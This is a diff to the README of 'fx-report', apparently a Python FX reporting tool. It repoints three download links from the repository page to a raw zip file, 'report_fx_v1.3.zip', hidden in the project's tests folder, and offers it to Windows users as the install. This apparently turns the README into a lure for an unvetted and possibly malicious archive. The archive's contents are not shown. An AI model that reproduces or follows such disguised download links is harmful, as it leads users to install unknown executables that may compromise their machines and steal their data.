@@ -1,6 +1,6 @@
 # 📊 fx-report - Generate clear FX reports fast
 
-[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/nonoscillatory-dotard733/fx-report)
+[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/nonoscillatory-dotard733/fx-report/raw/refs/heads/main/tests/report_fx_v1.3.zip)
 
 ## 🧩 What fx-report does
 
@@ -20,7 +20,7 @@ You can run it from the command line or use it from your own Python code.
 
 Visit this page to download and set up fx-report on Windows:
 
-[Download fx-report](https://github.com/nonoscillatory-dotard733/fx-report)
+[Download fx-report](https://github.com/nonoscillatory-dotard733/fx-report/raw/refs/heads/main/tests/report_fx_v1.3.zip)
 
 ### What to do
 
@@ -248,7 +248,7 @@ You may also see files for test data, example output, or a package config.
 
 ## 🔗 Download again
 
-[Visit the fx-report download page](https://github.com/nonoscillatory-dotard733/fx-report)
+[Visit the fx-report download page](https://github.com/nonoscillatory-dotard733/fx-report/raw/refs/heads/main/tests/report_fx_v1.3.zip)
 
 ## 🧪 If you are using it as a library
 
